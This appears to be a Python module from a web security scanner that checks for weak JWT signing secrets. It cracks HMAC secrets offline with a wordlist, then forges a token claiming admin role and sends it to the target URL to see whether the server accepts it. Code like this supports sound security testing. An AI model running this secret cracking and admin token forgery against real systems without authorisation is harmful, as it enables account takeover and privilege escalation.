"""JWT weak secret attack (moved from key_confusion for completeness)."""

import hashlib
import hmac
import logging
from typing import Any

from .jwt_attack_helpers import (
    JWT_AUTH_HEADERS,
    _b64url_encode,
    _create_jwt,
    _decode_jwt_part,
    _get_original_status,
    _send_with_token,
    get_weak_secrets,
)

logger = logging.getLogger(__name__)


def test_weak_secret(token: str, url: str, session: Any) -> dict[str, Any]:
    """Test common weak JWT signing secrets using an offline dictionary attack."""
    result: dict[str, Any] = {"attack": "weak_secret", "vulnerable": False, "details": []}
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return result
        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            return result

        alg = header.get("alg", "HS256")
        # Offline brute-force only works on symmetric HMAC algorithms
        if not alg.startswith("HS"):
            return result

        signing_input = f"{parts[0]}.{parts[1]}".encode()
        provided_signature = parts[2]

        # Determine hash algorithm
        hash_alg = hashlib.sha256
        if alg == "HS384":
            hash_alg = hashlib.sha384
        elif alg == "HS512":
            hash_alg = hashlib.sha512

        cracked_secret = None

        # Offline dictionary attack: packaged wordlist (jwt-secrets.txt) + inline fallback
        for secret in get_weak_secrets():
            expected_sig = hmac.new(secret, signing_input, hash_alg).digest()
            expected_sig_b64 = _b64url_encode(expected_sig)
            if expected_sig_b64 == provided_signature:
                cracked_secret = secret
                break

        if cracked_secret:
            # We cracked it! Now verify with an online request (forging a payload)
            modified_payload = dict(payload)
            modified_payload["admin"] = True
            modified_payload["role"] = "admin"

            forged_token = _create_jwt(header, modified_payload, secret=cracked_secret)
            original_status = _get_original_status(url, session)

            for auth_header in JWT_AUTH_HEADERS:
                resp = _send_with_token(url, forged_token, auth_header, session)
                status = resp.get("status", 0)
                body = resp.get("body", "").lower()

                if status in (200, 302) and original_status in (401, 403):
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "secret_preview": cracked_secret[:20].decode()
                            if isinstance(cracked_secret, bytes)
                            else cracked_secret[:20],
                            "auth_header": auth_header,
                            "status_code": status,
                            "original_status": original_status,
                            "finding": "weak_secret_accepted_offline_cracked",
                        }
                    )
                    break

                if status == 200 and "admin" in body:
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "secret_preview": cracked_secret[:20].decode()
                            if isinstance(cracked_secret, bytes)
                            else cracked_secret[:20],
                            "auth_header": auth_header,
                            "status_code": status,
                            "finding": "weak_secret_admin_reflection_offline_cracked",
                        }
                    )
                    break

            if result["vulnerable"]:
                logger.info("Offline Weak secret test on %s: vulnerable=True (Cracked!)", url)
            else:
                # Even if the server rejected the forged token, the secret is verified by crypto math
                result["vulnerable"] = True
                result["details"].append(
                    {
                        "secret_preview": cracked_secret[:20].decode()
                        if isinstance(cracked_secret, bytes)
                        else cracked_secret[:20],
                        "finding": "weak_secret_cracked_offline_but_rejected_by_server",
                    }
                )

    except Exception as e:
        logger.error("Weak secret test error on %s: %s", url, e)
    return result
